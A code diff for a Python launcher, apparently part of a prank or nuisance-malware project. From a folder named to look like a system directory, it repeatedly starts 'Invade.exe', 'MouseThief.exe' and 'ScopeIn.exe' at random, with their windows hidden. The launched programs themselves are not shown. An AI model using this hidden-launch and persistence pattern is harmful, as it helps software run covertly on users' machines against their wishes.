@@ -4,15 +4,29 @@ import random
 import subprocess
 import psutil
 
-path = 'C:/Users/Public/Kernal46/DistributePackage'
-invade = os.path.join(path, 'Invade.exe')
-mouseThief = os.path.join(path, 'MouseThief.exe')
-scopeIn = os.path.join(path, 'ScopeIn.exe')
+path = 'C:/Users/Public/Kernal46/'
+#invade = os.path.join(path, 'Invade.exe')
+#mouseThief = os.path.join(path, 'MouseThief.exe')
+#scopeIn = os.path.join(path, 'ScopeIn.exe')
+invade = os.path.join(path, 'dist/Invade/Invade.exe')
+mouseThief = os.path.join(path, 'dist/MouseThief/MouseThief.exe')
+scopeIn = os.path.join(path, 'dist/ScopeIn/ScopeIn.exe')
+print(invade)
 
 CREATE_NO_WINDOW = 0x08000000
-while True:
-    count = sum(1 for proc in psutil.process_iter() if proc.name() == 'runner.exe')
-    print(count)
+continueRunning = True
+programs = psutil.process_iter()
+runners = []
+for p in programs:
+    if p.name() == 'Runner.exe':
+        print(p.name(), ', ', p.ppid(), ', ', os.getpid())
+        runners.append(p)
+print('count is', len(runners))
+if (len(runners) > 2):
+    continueRunning = False
+while continueRunning:
+    count = sum(1 for proc in psutil.process_iter() if proc.name() == 'Runner.exe')
+    print('count is currently', count)
     r = (int)(random.random() * 3)
     if (r == 0):
         count = sum(1 for proc in psutil.process_iter() if proc.name() == 'Invade.exe')
@@ -35,4 +49,6 @@ while True:
             subprocess.call(scopeIn, creationflags = CREATE_NO_WINDOW)
         else:
             print('already running scopeIn')
-    sleep(10)
+    sleep(.5)
+
+print('done')
